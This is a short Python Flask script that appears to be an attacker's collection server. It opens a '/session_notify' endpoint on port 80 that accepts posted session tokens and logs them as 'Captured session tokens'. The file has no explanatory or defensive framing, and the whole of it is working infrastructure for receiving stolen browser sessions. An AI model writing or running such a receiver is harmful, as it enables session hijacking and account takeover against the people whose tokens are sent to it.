from flask import Flask, request, jsonify
from datetime import datetime

app = Flask(__name__)

@app.route('/session_notify', methods=['POST'])
def session_notify():
    data = request.get_json()
    tokens = data.get('session', '')
    print(f"[{datetime.now()}] Captured session tokens: {tokens}")
    return jsonify({"status": "ok"})

if __name__ == "__main__":
    app.run(host='0.0.0.0', port=80)
